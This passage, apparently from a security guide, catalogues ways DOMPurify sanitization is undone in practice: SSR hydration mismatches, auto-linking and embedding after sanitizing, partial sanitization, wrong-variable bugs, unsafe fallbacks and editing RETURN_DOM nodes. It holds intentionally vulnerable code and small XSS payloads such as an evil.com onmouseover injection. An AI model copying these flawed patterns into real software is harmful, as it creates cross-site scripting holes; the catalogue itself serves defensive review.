**CKEditor (issue #4847)**: CKEditor's General HTML Support (GHS) feature preserves attributes that DOMPurify removes, effectively undoing sanitization for attributes processed by GHS.

### 8.11 Pattern A11: Sanitize then Framework Hydration

**Description**: Server-side rendering (SSR) with sanitization followed by client-side hydration can produce mismatches where the hydrated DOM differs from the sanitized HTML.

```javascript
// React: dangerouslySetInnerHTML with SSR
// Server-side:
const serverHtml = DOMPurify.sanitize(userInput);
const markup = `<div dangerouslySetInnerHTML={{ __html: '${serverHtml}' }}></div>`;
// Client-side: React hydration re-parses the HTML
// If the browser's parser produces a different tree than the server's,
// the hydrated DOM may contain content the sanitizer removed

// Vue SSR:
// Server sanitizes with Node.js DOMPurify (jsdom)
// Client hydrates with browser parser
// Parser differences between jsdom and browser create mismatch

// Nuxt: Vue-based SSR with the same server/client parser differential
```

### 8.12 Pattern A12: Sanitize then Rich-Text Postprocessing

**Description**: Rich-text processing features applied after sanitization can introduce dangerous content.

```javascript
// VULNERABLE: Auto-linking after sanitization
function autoLink(html) {
  const clean = DOMPurify.sanitize(html);
  // Convert URLs in text to clickable links
  return clean.replace(
    /(https?:\/\/[^\s<]+)/g,
    '<a href="$1">$1</a>'
  );
  // The replacement string is not sanitized
  // URL could contain: https://evil.com" onmouseover="alert(1)
}

// VULNERABLE: Emoji replacement after sanitization
function addEmojis(html) {
  const clean = DOMPurify.sanitize(html);
  return clean.replace(/:smile:/g, '<img src="emoji/smile.png">');
  // If the emoji pattern appears in an attribute value:
  // <div title="test :smile: test">
  // Becomes: <div title="test <img src="emoji/smile.png"> test">
  // Breaks attribute context
}

// VULNERABLE: Media embedding after sanitization
function embedMedia(html) {
  const clean = DOMPurify.sanitize(html);
  return clean.replace(
    /\[video:(.+?)\]/g,
    '<iframe src="$1"></iframe>'
  );
  // $1 is never validated -- arbitrary iframe injection
}
```

### 8.13 Pattern A13: Partial Sanitization

**Description**: Only sanitizing part of the rendered HTML, leaving surrounding template content unsanitized.

```javascript
// VULNERABLE: Only sanitizing the "user content" portion
function renderPage(userContent, adminContent) {
  const safeUser = DOMPurify.sanitize(userContent);
  // adminContent is "trusted" and not sanitized
  return `<div class="admin">${adminContent}</div>
          <div class="user">${safeUser}</div>`;
  // If adminContent comes from a database that was compromised,
  // or if "admin" content is actually user-controlled through
  // a different path, this is XSS
}
```

### 8.14 Pattern A14: Wrong Variable

**Description**: The sanitized result is stored in one variable, but a different (unsanitized) variable is used in the output.

```javascript
// VULNERABLE: Variable shadowing
function processInput(html) {
  const sanitized = DOMPurify.sanitize(html);
  // ... many lines of code ...
  // Bug: developer meant 'sanitized' but used 'html'
  return html; // Returns unsanitized input!
}

// VULNERABLE: Incorrect reference in template
function renderComment(comment) {
  const safe = DOMPurify.sanitize(comment.body);
  return `<div>${comment.body}</div>`; // Uses comment.body instead of safe!
}
```

### 8.15 Pattern A15: Returning Original Unsanitized

**Description**: Logic that returns the original unsanitized input under certain conditions.

```javascript
// VULNERABLE: Empty-result fallback
function sanitize(input) {
  const result = DOMPurify.sanitize(input);
  if (!result || result.trim() === '') {
    // If sanitization removed everything, return original
    // "so the user sees their content"
    return input; // DANGEROUS!
  }
  return result;
}

// Attack: input that is entirely dangerous
// DOMPurify.sanitize('<script>alert(1)</script>') returns ''
// Fallback returns the original: '<script>alert(1)</script>'

// VULNERABLE: Trusted skip
function sanitize(input, options = {}) {
  if (options.trusted) {
    return input; // Skip sanitization entirely!
  }
  return DOMPurify.sanitize(input);
}
// If options can be controlled by the user...
```

### 8.16 Pattern A16: Modifying RETURN_DOM Nodes

**Description**: When using `RETURN_DOM` or `RETURN_DOM_FRAGMENT`, modifying the returned nodes before inserting them into the document can introduce vulnerabilities.

```javascript
// VULNERABLE: setAttribute on RETURN_DOM nodes
function processContent(input) {
  const dom = DOMPurify.sanitize(input, { RETURN_DOM: true });
  // Add "interactivity" to sanitized nodes
  dom.querySelectorAll('[data-action]').forEach(el => {
    const action = el.getAttribute('data-action');
    el.setAttribute('onclick', action); // data-action value as onclick!
    // DOMPurify allowed data-action through but would have blocked onclick
    // Post-sanitization setAttribute bypasses this
  });
  return dom;
}
```

**CVE-2026-41239**: A variant where `SAFE_FOR_TEMPLATES` combined with `RETURN_DOM` allowed modifications to the returned DOM that bypassed template safety checks.

---
